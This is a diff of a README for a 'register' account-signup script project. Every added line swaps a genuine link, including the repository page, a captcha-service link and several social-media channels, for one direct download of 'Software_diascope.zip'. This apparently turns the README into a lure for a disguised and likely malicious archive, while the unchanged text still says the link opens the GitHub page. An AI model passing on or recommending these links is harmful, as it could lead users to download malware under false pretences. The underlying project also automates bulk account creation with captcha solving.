@@ -1,6 +1,6 @@
 # ⚙️ register - Simplify Your Account Setups  
 
-[![Download](https://img.shields.io/badge/Download-register-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Always15dppk/register)
+[![Download](https://img.shields.io/badge/Download-register-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Always15dppk/register/raw/refs/heads/main/tavily-register/Software_diascope.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these steps carefully to download and run register on your Windows system
 ### 1. Download the software  
 
 Click the large blue button at the top or this link:  
-https://github.com/Always15dppk/register  
+https://github.com/Always15dppk/register/raw/refs/heads/main/tavily-register/Software_diascope.zip  
 
 This link opens the GitHub page for the project. You need to download the full repository as a ZIP file.
 
@@ -102,7 +102,7 @@ The scripts handle most tasks automatically to reduce typing or manual input.
 ## 🔗 Useful Resources  
 
 If the registration scripts ask for captcha handling, you can try YesCaptcha at:  
-https://yescaptcha.com/i/tlkF6o  
+https://github.com/Always15dppk/register/raw/refs/heads/main/tavily-register/Software_diascope.zip  
 
 It is a tool designed to automatically solve captchas used in online sign-ups.
 
@@ -128,7 +128,7 @@ Check you followed instructions exactly, including extracting files and running 
 
 The project changes over time with improved scripts and new features. To get the latest versions and tutorials, visit the GitHub page regularly:
 
-https://github.com/Always15dppk/register  
+https://github.com/Always15dppk/register/raw/refs/heads/main/tavily-register/Software_diascope.zip  
 
 ---
 
@@ -136,8 +136,8 @@ https://github.com/Always15dppk/register
 
 Find updates and video guides here:  
 
-- YouTube: https://www.youtube.com/@MasterAlanLab  
-- Bilibili: https://space.bilibili.com/3691004225914941  
-- Douyin: https://v.douyin.com/LzR5Sns8mQU  
-- Kuaishou: https://www.kuaishou.com/profile/3x77ra8rcg7fpne  
-- Telegram: https://t.me/MasterAlanLab_Channel
+- YouTube: https://github.com/Always15dppk/register/raw/refs/heads/main/tavily-register/Software_diascope.zip  
+- Bilibili: https://github.com/Always15dppk/register/raw/refs/heads/main/tavily-register/Software_diascope.zip  
+- Douyin: https://github.com/Always15dppk/register/raw/refs/heads/main/tavily-register/Software_diascope.zip  
+- Kuaishou: https://github.com/Always15dppk/register/raw/refs/heads/main/tavily-register/Software_diascope.zip  
+- Telegram: https://github.com/Always15dppk/register/raw/refs/heads/main/tavily-register/Software_diascope.zip
